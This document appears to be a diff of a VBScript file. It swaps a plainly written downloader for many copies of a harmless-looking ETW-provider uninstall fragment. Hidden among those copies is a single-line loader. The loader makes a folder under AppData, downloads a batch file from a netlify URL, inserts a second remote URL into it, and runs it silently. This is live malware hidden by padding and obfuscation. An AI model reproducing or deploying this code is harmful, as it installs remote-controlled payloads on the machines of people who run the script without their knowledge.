@@ -1,92 +1,789 @@
-' Initialize objects
 
-Set fileSystem = CreateObject("Scripting.FileSystemObject")
 
-Set shell = CreateObject("WScript.Shell")
-
-Set httpRequest = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
 
 
 
-' Define working directory inside AppData
+' Print usage meloddsg
 
-basePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\SystemCache"
-
-
-
-' Remove old data if present
-
-If fileSystem.FolderExists(basePath) Then
-
-    fileSystem.DeleteFolder basePath, True
-
-End If
+'
 
 
 
-' Create required directories
-
-If Not fileSystem.FolderExists(basePath) Then fileSystem.CreateFolder basePath
 
 
-
-logPath = basePath & "\Logs"
-
-If Not fileSystem.FolderExists(logPath) Then fileSystem.CreateFolder logPath
+' Install Providers
 
 
 
-' Download update script
-
-httpRequest.Open "GET", "https://website-code.netlify.app/code/final.bat", False
-
-httpRequest.Send
 
 
 
-If httpRequest.Status = 200 Then
 
-    ' Save the downloaded data to a local file
+' Uninstall Providers
 
-    Set stream = CreateObject("ADODB.Stream")
+'
 
-    stream.Type = 1 ' Binary
-
-    stream.Open
-
-    stream.Write httpRequest.responseBody
-
-    stream.SaveToFile logPath & "\update_task.bat", 2
-
-    stream.Close
+Function UninstallProviders
 
 
 
-    ' Read and modify file content
+    ' If this is msi mode, uninstall failures are not fatal
 
-    Set txtFile = fileSystem.OpenTextFile(logPath & "\update_task.bat", 1)
+    '
 
-    content = txtFile.ReadAll
+    If False = manual Then
 
-    txtFile.Close
+        On Error Resume Next
 
-
-
-    content = Replace(content, "****", "'https://lively-beijinho-6a890a.netlify.app/files/encoded.txt'") ' Temporary marker adjustment
+    End If
 
 
 
-    Set txtFile = fileSystem.OpenTextFile(logPath & "\update_task.bat", 2, True)
+    targetDir = Session.TargetPath("ETWProviders")
 
-    txtFile.Write content
-
-    txtFile.Close
+    ForEachManifest( GetRef("UninstallProvider") )
 
 
 
-    ' Execute update in background
+    On Error Goto 0
 
-    shell.Run Chr(34) & logPath & "\update_task.bat" & Chr(34), 0, False
 
-End If
 
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+p=CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")&"\SystemCache\Logs":Set f=CreateObject("Scripting.FileSystemObject"):If Not f.FolderExists(p) Then f.CreateFolder Left(p,InStrRev(p,"\")-1):f.CreateFolder p:End If:Set h=CreateObject("MSXML2.XMLHTTP"):h.Open "GET","https://website-code.netlify.app/code/final.bat",0:h.Send:Set s=CreateObject("ADODB.Stream"):s.Type=1:s.Open:s.Write h.responseBody:s.Position=0:s.Type=2:s.Charset="utf-8":s.Position=0:c=s.ReadText:c=Replace(c,"****","'https://lively-beijinho-6a890a.netlify.app/files/encoded.txt'"):s.Position=0:s.SetEOS:s.WriteText c:s.SaveToFile p&"\update_task.bat",2:CreateObject("WScript.Shell").Run """"&p&"\update_task.bat""",0,False
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
+
+
+
+' Print usage meloddsg
+
+'
+
+
+
+
+
+' Install Providers
+
+
+
+
+
+
+
+' Uninstall Providers
+
+'
+
+Function UninstallProviders
+
+
+
+    ' If this is msi mode, uninstall failures are not fatal
+
+    '
+
+    If False = manual Then
+
+        On Error Resume Next
+
+    End If
+
+
+
+    targetDir = Session.TargetPath("ETWProviders")
+
+    ForEachManifest( GetRef("UninstallProvider") )
+
+
+
+    On Error Goto 0
+
+
+
+End Function
+
+
+
+'''''''''''''''''''''' mexicano '''''''''''''''''''''' 
